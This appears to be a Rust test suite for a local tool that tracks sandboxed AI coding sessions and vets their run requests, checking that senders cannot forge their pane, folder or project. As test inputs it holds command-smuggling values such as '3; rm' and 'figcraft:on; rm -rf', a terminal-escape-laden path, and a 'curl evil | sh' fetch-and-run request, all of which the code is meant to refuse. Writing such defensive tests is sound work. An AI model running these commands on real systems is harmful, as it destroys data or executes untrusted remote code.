    let folder = bench.fixture.root.join("evil");
    fs::create_dir_all(bench.fixture.root.join("store/x\x1b[8my/.git")).unwrap();
    fs::create_dir_all(&folder).unwrap();
    fs::write(folder.join(".git"), format!("gitdir: {}\n", bench.fixture.root.join("store/x\x1b[8my/.git").display())).unwrap();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": folder.to_string_lossy(), "project": "evil"}));
    assert_eq!(bench.snapshot()[0]["project"], "evil");
}

// ---- Reports through the socket: the sender decides the pane ----

/// A process tree with namespaces: (pid, parent, namespace, environment).
struct Tree(Vec<(&'static str, Option<&'static str>, &'static str, HashMap<String, String>)>);

struct TimedTree { tree: Tree, start: String, boot: String }

impl Processes for TimedTree {
    fn pids(&self) -> Vec<String> { self.tree.pids() }
    fn comm(&self, pid: &str) -> String { self.tree.comm(pid) }
    fn command(&self, pid: &str) -> Vec<String> { self.tree.command(pid) }
    fn environment(&self, pid: &str) -> HashMap<String, String> { self.tree.environment(pid) }
    fn parent(&self, pid: &str) -> Option<String> { self.tree.parent(pid) }
    fn pid_namespace(&self, pid: &str) -> Option<String> { self.tree.pid_namespace(pid) }
    fn start_time(&self, _: &str) -> Option<String> { Some(self.start.clone()) }
    fn boot_id(&self) -> Option<String> { Some(self.boot.clone()) }
}

#[test]
fn team_runtime_proof_changes_when_a_launcher_pid_is_reused_or_the_machine_reboots() {
    let mut tree = TimedTree { tree:Tree(vec![("50",Some("30"),"sandbox",environment(&[])),("30",None,"host",environment(&[]))]),
        start:"1000".into(),boot:"boot-a".into() };
    let original = trusted_runtime(&tree, "50").unwrap();
    assert!(runtime_is_live(&tree, &original));
    tree.start = "1001".into();
    assert!(!runtime_is_live(&tree, &original));
    assert_ne!(trusted_runtime(&tree, "50").unwrap(), original);
    tree.start = "1000".into();
    tree.boot = "boot-b".into();
    assert!(!runtime_is_live(&tree, &original));
}

#[test]
fn host_processes_cannot_claim_to_be_agent_transport_peers() {
    let tree = TimedTree { tree:Tree(vec![("30",None,"host",environment(&[]))]),start:"1000".into(),boot:"boot-a".into() };
    assert_eq!(trusted_runtime(&tree, "30"), None);
}

#[test]
fn process_start_time_parsing_handles_parentheses_and_spaces_in_the_command_name() {
    let stat = format!("50 (a command ) name) S {} 9876 0", (4..=21).map(|number| number.to_string()).collect::<Vec<_>>().join(" "));
    assert_eq!(parse_process_start_time(&stat), Some("9876".into()));
    assert_eq!(parse_process_start_time("not a stat record"), None);
}

impl Processes for Tree {
    fn pids(&self) -> Vec<String> { self.0.iter().map(|row| row.0.to_string()).collect() }
    fn comm(&self, _: &str) -> String { String::new() }
    fn command(&self, _: &str) -> Vec<String> { Vec::new() }
    fn environment(&self, pid: &str) -> HashMap<String, String> {
        self.0.iter().find(|row| row.0 == pid).map(|row| row.3.clone()).unwrap_or_default()
    }
    fn parent(&self, pid: &str) -> Option<String> {
        self.0.iter().find(|row| row.0 == pid).and_then(|row| row.1).map(str::to_string)
    }
    fn pid_namespace(&self, pid: &str) -> Option<String> {
        if pid == "self" { return Some("host".into()) }
        self.0.iter().find(|row| row.0 == pid).map(|row| row.2.to_string())
    }
}

fn environment(pairs: &[(&str, &str)]) -> HashMap<String, String> {
    pairs.iter().map(|(name, value)| (name.to_string(), value.to_string())).collect()
}

#[test]
fn the_pane_comes_from_the_first_process_outside_the_sandbox() {
    // socat (in the sandbox, forging TMUX_PANE) <- hook <- bwrap (outside, the launcher's pane).
    let tree = Tree(vec![
        ("50", Some("40"), "sandbox", environment(&[("TMUX_PANE", "%1")])),
        ("40", Some("30"), "sandbox", environment(&[("TMUX_PANE", "%1")])),
        ("30", Some("20"), "host", environment(&[("TMUX_PANE", "%7"), ("KITTY_PID", "4242")])),
        ("20", None, "host", environment(&[])),
    ]);
    assert_eq!(trusted_target(&tree, "50"), Some(target(&[("tmux_pane", "%7"), ("kitty_pid", "4242")])));
}

#[test]
fn a_sender_with_no_process_outside_the_sandbox_is_not_placed() {
    let tree = Tree(vec![("50", Some("40"), "sandbox", environment(&[])), ("40", None, "sandbox", environment(&[]))]);
    assert_eq!(trusted_target(&tree, "50"), None);
}

#[test]
fn a_report_gets_its_senders_pane_not_the_one_it_claims() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "state": "working", "tmux_pane": "%1"}).to_string()).unwrap();
    bench.registry.report_from(report, 500).unwrap();
    assert_eq!(bench.registry.sessions[SESSION_A].target.get("tmux_pane").map(String::as_str), Some("%7"));
}

#[test]
fn a_waiting_session_gaining_its_senders_pane_publishes_the_target() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[]));
    let report = || parse_session(&json!({"session": SESSION_A, "project": "p", "state": "waiting"}).to_string()).unwrap();
    bench.registry.report_from(report(), 500).unwrap();
    assert!(bench.snapshot()[0].get("tmux_pane").is_none());
    let since = bench.registry.sessions[SESSION_A].since;

    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    bench.registry.report_from(report(), 500).unwrap();

    let row = &bench.snapshot()[0];
    assert_eq!(row["tmux_pane"], "%7");
    assert_eq!(row["state"], "waiting");
    assert_eq!(bench.registry.sessions[SESSION_A].since, since);
}

#[test]
fn a_session_cannot_be_moved_off_a_pane_where_it_still_runs() {
    // Another sandbox reporting the dotfiles session's id from its own pane would take its card.
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.sender_targets.insert(500, target(&[("tmux_pane", "%1")]));
        world.sender_targets.insert(600, target(&[("tmux_pane", "%9")]));
        world.claude_panes = set(&["%1", "%9"]);
    }
    let report = |state: &str| parse_session(&json!({"session": SESSION_A, "project": "p", "state": state}).to_string()).unwrap();
    bench.registry.report_from(report("waiting"), 500).unwrap();
    assert!(bench.registry.report_from(report("needs-you"), 600).is_err());
    let entry = &bench.registry.sessions[SESSION_A];
    assert_eq!((entry.target.get("tmux_pane").map(String::as_str), entry.state.as_str()), (Some("%1"), "waiting"));
}

#[test]
fn a_report_from_an_unplaceable_sender_is_refused() {
    let mut bench = Bench::new();
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "state": "working"}).to_string()).unwrap();
    assert!(bench.registry.report_from(report, 777).is_err());
    assert!(bench.registry.sessions.is_empty());
}

#[test]
fn a_session_theo_looked_at_loses_its_sticky_banner() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Claude is waiting for your input", "sticky": true}));
    bench.report(SESSION_B, json!({"state": "waiting", "message": "Claude is waiting for your input", "sticky": true}));
    bench.registry.seen(SESSION_A);
    assert!(bench.dropped().contains(&SESSION_A.to_string()));
    assert!(!bench.dropped().contains(&SESSION_B.to_string()), "only the session looked at");
}

#[test]
fn seen_ignores_what_is_not_a_session_id() {
    let mut bench = Bench::new();
    bench.registry.seen("notice:budget");
    assert!(bench.dropped().is_empty());
}

#[test]
fn a_terminal_session_is_marked_in_the_snapshot_and_the_reboot_record() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/a", "terminal": true}));
    bench.report(SESSION_A, json!({"state": "working"}));
    bench.report(SESSION_B, json!({"state": "waiting", "cwd": "/b"}));
    let terminal: Vec<bool> = [SESSION_A, SESSION_B].iter()
        .map(|id| bench.snapshot().iter().find(|row| row["session"] == *id).unwrap()["terminal"].as_bool().unwrap()).collect();
    assert_eq!(terminal, [true, false], "a later report without the flag keeps it");
    let recent: Value = serde_json::from_str(&fs::read_to_string(cockpit::paths::recent_sessions()).unwrap()).unwrap();
    assert_eq!(recent[SESSION_A]["terminal"], true);
}

#[test]
fn a_credits_session_is_marked_in_the_snapshot_and_the_reboot_record_until_it_switches_back() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/a", "credits": true}));
    bench.report(SESSION_A, json!({"state": "working"}));
    let credits = |bench: &Bench| bench.snapshot().iter().find(|row| row["session"] == SESSION_A).unwrap()["credits"].clone();
    assert_eq!(credits(&bench), true, "a report without the field keeps it");
    let recent: Value = serde_json::from_str(&fs::read_to_string(cockpit::paths::recent_sessions()).unwrap()).unwrap();
    assert_eq!(recent[SESSION_A]["credits"], true);
    bench.report(SESSION_A, json!({"state": "waiting", "credits": false}));
    assert_eq!(credits(&bench), false);
}

#[test]
fn unpushed_commits_are_counted_and_cleared_by_a_push() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/r/dotfiles", "unpushed": 3}));
    bench.report(SESSION_A, json!({"state": "working"}));
    let unpushed = |bench: &Bench| bench.snapshot()[0]["unpushed"].as_u64().unwrap();
    assert_eq!(unpushed(&bench), 3, "a report without a count keeps the last one");
    bench.registry.pushed("/r/elsewhere");
    assert_eq!(unpushed(&bench), 3);
    bench.registry.pushed("/r/dotfiles");
    assert_eq!(unpushed(&bench), 0);
}

#[test]
fn an_unpushed_count_must_be_a_count() {
    assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "unpushed": "3; rm"}).to_string()).is_err());
}

#[test]
fn background_counts_last_until_a_report_says_otherwise() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "agents": 2, "background": 1}));
    bench.report(SESSION_A, json!({"state": "working"}));
    let counts = |bench: &Bench| { let row = &bench.snapshot()[0]; (row["agents"].as_u64().unwrap(), row["background"].as_u64().unwrap()) };
    assert_eq!(counts(&bench), (2, 1), "a report without counts keeps the last ones");
    bench.report(SESSION_A, json!({"state": "waiting", "agents": 0, "background": 0}));
    assert_eq!(counts(&bench), (0, 0));
}

#[test]
fn background_counts_must_be_counts() {
    for key in ["agents", "background"] {
        assert!(parse_session(&json!({"session": SESSION_A, "project": "p", key: "2; rm"}).to_string()).is_err(), "{key}");
    }
}

#[test]
fn a_session_says_which_craft_apps_it_drives() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "apps": "figcraft:on"}));
    bench.report(SESSION_A, json!({"state": "waiting"}));
    assert_eq!(bench.snapshot()[0]["apps"], "figcraft:on", "a report without the field keeps it");
    bench.report(SESSION_A, json!({"state": "working", "apps": ""}));
    assert_eq!(bench.snapshot()[0]["apps"], "");
}

#[test]
fn an_apps_field_that_is_not_a_list_of_apps_is_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "apps": "figcraft:on; rm -rf"}).to_string()).is_err());
}

#[test]
fn a_reported_folder_gives_way_to_the_one_its_sandbox_started_in() {
    // Security audit M1: a restart would resume the session in the claimed folder's sandbox.
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
        world.sender_directories.insert(500, "/home/theo/IdeaProjects/opusline".into());
    }
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "state": "waiting", "cwd": "/home/theo/IdeaProjects/dotfiles"}).to_string()).unwrap();
    bench.registry.report_from(report, 500).unwrap();
    assert_eq!(bench.registry.sessions[SESSION_A].cwd, "/home/theo/IdeaProjects/opusline");
}

#[test]
fn a_session_whose_sandbox_folder_is_unknown_gets_no_folder() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "state": "waiting", "cwd": "/home/theo/IdeaProjects/dotfiles"}).to_string()).unwrap();
    bench.registry.report_from(report, 500).unwrap();
    assert_eq!(bench.registry.sessions[SESSION_A].cwd, "");
}

#[test]
fn the_sandbox_folder_is_where_the_first_process_outside_it_runs() {
    struct Folders(Tree);
    impl Processes for Folders {
        fn pids(&self) -> Vec<String> { self.0.pids() }
        fn comm(&self, pid: &str) -> String { self.0.comm(pid) }
        fn command(&self, pid: &str) -> Vec<String> { self.0.command(pid) }
        fn environment(&self, pid: &str) -> HashMap<String, String> { self.0.environment(pid) }
        fn parent(&self, pid: &str) -> Option<String> { self.0.parent(pid) }
        fn pid_namespace(&self, pid: &str) -> Option<String> { self.0.pid_namespace(pid) }
        fn cwd(&self, pid: &str) -> Option<String> { Some(format!("/folder-of-{pid}")) }
    }
    let tree = Folders(Tree(vec![
        ("50", Some("40"), "sandbox", environment(&[])),
        ("40", Some("30"), "sandbox", environment(&[])),
        ("30", Some("20"), "host", environment(&[])),
        ("20", None, "host", environment(&[])),
    ]));
    assert_eq!(sandbox_directory(&tree, "50").as_deref(), Some("/folder-of-30"));
}

/// A project folder under the fixture, a repository, and the answers folder name its sandboxes get.
fn project_folder(bench: &Bench) -> (String, String) {
    let folder = bench.fixture.root.join("IdeaProjects/proj-a");
    fs::create_dir_all(folder.join(".git")).unwrap();
    let key = folder.to_string_lossy().chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '-' }).collect();
    (folder.to_string_lossy().into_owned(), key)
}

const NEW_RUN: &str = "cccccccccccc";

#[test]
fn a_request_from_the_socket_is_held_with_the_folder_its_sandbox_started_in() {
    // Security audit H3: the approval reads only this copy, out of every sandbox's reach.
    let mut bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, format!("{folder}/apps"));
    let raw = json!({"id": NEW_RUN, "command": "make", "cwd": "/elsewhere", "project": "dotfiles", "answers": key}).to_string();
    bench.registry.request_from("run-request", &raw, 500).unwrap();
    let held: Value = serde_json::from_str(&fs::read_to_string(cockpit::approval::held_request(NEW_RUN, "request")).unwrap()).unwrap();
    assert_eq!((held["started_in"].as_str(), held["project"].as_str(), held["command"].as_str()),
               (Some(format!("{folder}/apps").as_str()), Some("proj-a"), Some("make")));
    assert_eq!(bench.registry.runs.current, NEW_RUN);
}

#[test]
fn a_request_cannot_replace_one_already_held() {
    let mut bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, folder);
    let raw = |command: &str| json!({"id": NEW_RUN, "command": command, "answers": key}).to_string();
    bench.registry.request_from("run-request", &raw("make check"), 500).unwrap();
    assert!(bench.registry.request_from("run-request", &raw("curl evil | sh"), 500).is_err());
    let held: Value = serde_json::from_str(&fs::read_to_string(cockpit::approval::held_request(NEW_RUN, "request")).unwrap()).unwrap();
    assert_eq!(held["command"], "make check");
}

#[test]
fn a_request_naming_another_projects_answers_folder_is_refused() {
    // Its answer would land where the asking session does not wait, or where another reads it.
    let mut bench = Bench::new();
    let (folder, _) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, folder);
    let raw = json!({"id": NEW_RUN, "command": "make", "answers": "-home-theo-IdeaProjects-dotfiles"}).to_string();
    assert!(bench.registry.request_from("run-request", &raw, 500).is_err());
    assert!(!cockpit::approval::held_request(NEW_RUN, "request").exists());
}

#[test]
fn a_request_from_a_sender_with_no_process_outside_the_sandbox_is_refused() {
    let mut bench = Bench::new();
    let raw = json!({"id": NEW_RUN, "command": "make", "answers": "x"}).to_string();
    assert!(bench.registry.request_from("guide-request", &raw, 777).is_err());
    assert!(bench.windows().is_empty());
}

#[test]
fn the_answers_folder_is_named_after_the_repository_top() {
    let bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    fs::create_dir_all(format!("{folder}/apps/api")).unwrap();
    assert_eq!(answers_key_of(Path::new(&format!("{folder}/apps/api"))), key);
}

#[test]
fn a_todo_update_is_queued_with_the_folder_its_sandbox_started_in() {
    // Security audit M4: that folder, not the update's own cwd, decides the project.
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/home/theo/IdeaProjects/opusline".into());
    let raw = json!({"action": "add", "text": "x", "cwd": "/home/theo/IdeaProjects/dotfiles", "started_in": "/forged"}).to_string();
    bench.registry.request_from("todo-update", &raw, 500).unwrap();
    let queued: Value = serde_json::from_str(fs::read_to_string(cockpit::paths::todo_updates()).unwrap().trim()).unwrap();
    assert_eq!(queued["started_in"], "/home/theo/IdeaProjects/opusline");
}

#[test]
fn a_full_todo_queue_takes_no_more() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/p".into());
    fs::write(cockpit::paths::todo_updates(), "x".repeat(2 << 20)).unwrap();
    assert!(bench.registry.request_from("todo-update", &json!({"action": "add", "text": "x"}).to_string(), 500).is_err());
}

#[test]
fn an_oversized_todo_update_is_refused() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/p".into());
    let raw = json!({"action": "add", "text": "x".repeat(70_000)}).to_string();
    assert!(bench.registry.request_from("todo-update", &raw, 500).is_err());
    assert!(!cockpit::paths::todo_updates().exists());
}

#[test]
fn a_sandbox_folder_has_at_most_three_requests_waiting() {
    // Security audit M5: one session must not fill Theo's approval queue.
    let mut bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, folder);
    let outcomes: Vec<bool> = ["111111111111", "222222222222", "333333333333", "444444444444"].iter()
        .map(|id| bench.registry.request_from("run-request", &json!({"id": id, "command": "true", "answers": key}).to_string(), 500).is_ok())
        .collect();
    assert_eq!(outcomes, [true, true, true, false]);
}

#[test]
fn a_request_held_or_refused_is_audited_without_its_command() {
    // Security audit M6: who asked what, from which sandbox folder; the command only as its hash.
    let mut bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, folder.clone());
    bench.registry.request_from("run-request", &json!({"id": NEW_RUN, "command": "make secret-step", "answers": key}).to_string(), 500).unwrap();
    let _ = bench.registry.request_from("run-request", &json!({"id": "bad"}).to_string(), 500);
    let day = cockpit::audit::dir().join(format!("audit-{}.jsonl", chrono::Local::now().format("%Y-%m-%d")));
    let lines: Vec<Value> = fs::read_to_string(day).unwrap().lines().map(|line| serde_json::from_str(line).unwrap()).collect();
    let events: Vec<(&str, &str)> = lines.iter().map(|line| (line["event"].as_str().unwrap(), line["outcome"].as_str().unwrap())).collect();
    assert_eq!(events, [("run.held", "ok"), ("run.refused", "refused")]);
    assert_eq!(lines[0]["started_in"].as_str(), Some(folder.as_str()));
    assert!(!lines[0].to_string().contains("secret-step"));
}
